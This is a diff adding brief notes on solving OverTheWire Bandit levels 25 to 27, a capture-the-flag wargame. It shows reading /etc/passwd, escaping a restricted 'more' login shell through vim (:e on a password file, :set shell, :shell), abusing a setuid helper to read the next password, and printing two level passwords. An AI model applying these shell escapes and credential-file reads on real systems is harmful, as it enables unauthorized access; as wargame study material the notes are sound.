@@ -1,0 +1,24 @@
+=>cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+=>cat /usr/bin/showtext 
+#!/bin/sh
+export TERM=linux
+more ~/text.txt
+exit 0
+
+=>more shows full page at a time so minimize and ssh with the key
+
+=>ssh -i bandit26.sshkey bandit26@localhost
+
+=>then press v to enter vim mode and run :e /etc/bandit_pass/bandit26 and to open the password of bandit26
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+=>then in order to get a shell run :set shell=/bin/bash
+=>then run :shell and you will get shell
+=>ls
+  bandit27-do  text.txt
+=>bandit27-do is a setuid binary so executing this 
+=>./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
